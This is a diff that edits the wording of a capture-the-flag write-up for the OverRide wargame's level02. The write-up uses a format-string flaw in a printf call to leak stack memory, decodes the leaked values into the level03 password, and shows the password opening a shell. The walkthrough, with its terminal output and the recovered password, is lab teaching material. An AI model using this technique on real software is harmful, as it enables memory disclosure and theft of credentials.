@@ -1,8 +1,8 @@
-after analysis from source code, we can see, he execute /bin/sh only if the password are the flag.
+After analyzing the source code, we can see that it executes /bin/sh only if the password matches the flag.
 
-we can see also an unprotected printf for display username, we can use it to display content of the line ``file = fopen("/home/users/level03/.pass", "r");``
+We also noticed an unprotected printf function used to display the username, which we can exploit to display the content of the line file = fopen("/home/users/level03/.pass", "r");.
 
-first test we can test :
+First, let's test this:
 
 ```
 level02@OverRide:~$ ./level02
@@ -15,12 +15,12 @@ level02@OverRide:~$ ./level02
 0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
 ```
 
-we can see 5 pointers 
+We can see five pointers:
 
 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
 
 
-we convert this on ascii : unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+Converting these to ASCII gives us: unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M.
 
 ```
 level02@OverRide:~$ ./level02
@@ -32,18 +32,19 @@ level02@OverRide:~$ ./level02
 --[ Password: unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
 *****************************************
 unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M does not have access!
+```
 
-we revert pointer order before convert in ascii :
+Next, we reverse the pointer order before converting to ASCII:
 
 0x48336750664b394d 0x354a35686e475873 0x377a7143574e6758 0x45414a3561733951 0x756e505234376848
 
 H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH
 
-we revert this string
+This gives us: H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH.
 
-Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+Reversing this string, we get: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H.
 
-we retest :
+Let's test this:
 
 ```
 level02@OverRide:~$ ./level02
@@ -57,5 +58,3 @@ level02@OverRide:~$ ./level02
 Greetings, Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H!
 $ 
 ```
-
-su level03 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
